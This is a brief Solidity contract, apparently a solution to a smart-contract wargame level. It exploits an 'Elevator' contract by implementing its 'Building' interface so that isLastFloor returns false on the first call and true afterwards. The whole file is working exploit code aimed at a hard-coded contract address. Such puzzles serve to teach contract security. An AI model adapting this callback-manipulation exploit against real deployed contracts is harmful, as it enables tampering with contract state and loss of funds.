pragma solidity ^0.6.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

interface Elevator {
    function goTo(uint256 _floor) external;
}

contract AttackElevator is Building {
    bool previouslyCalled;
    Elevator elevator;

    constructor() public {
        elevator = Elevator(0x998DBb41a3F011b438935383f3b67fc9ED03818D);
    }

    // return false the first time
    // return true for any subsequent calls
    function isLastFloor(uint256) public override returns (bool) {
        if (!previouslyCalled) {
            previouslyCalled = true;
            return false;
        } else {
            return true;
        }
    }

    function attack() public {
        // can use any uint
        elevator.goTo(0);
    }
}
